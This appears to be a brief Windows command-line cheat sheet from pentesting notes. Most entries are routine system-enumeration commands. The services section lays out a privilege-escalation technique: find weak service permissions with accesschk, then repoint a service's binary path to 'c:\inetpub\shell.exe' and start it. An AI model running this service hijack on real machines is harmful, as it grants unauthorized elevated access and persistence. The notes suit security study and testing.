# dos

## see running service processes
tasklist /SVC

## windows services and drivers
net start

## installed drivers
driverquery

## active network connections
netstat -ano

## show environment variables
set

## access check sysinternals
upload accesschk.exe
```dos
ac.exe /accepteula -uwcqv "Authenticated Users" *
```

## services sc

### enable service
### set to auto start
sc config SVC_NAME start= auto

### set binary path
sc config SVC_NAME binpath= "c:\inetpub\shell.exe"

### start service
net start SVC_NAME

## kill process by id
taskkill /f /pid 1234
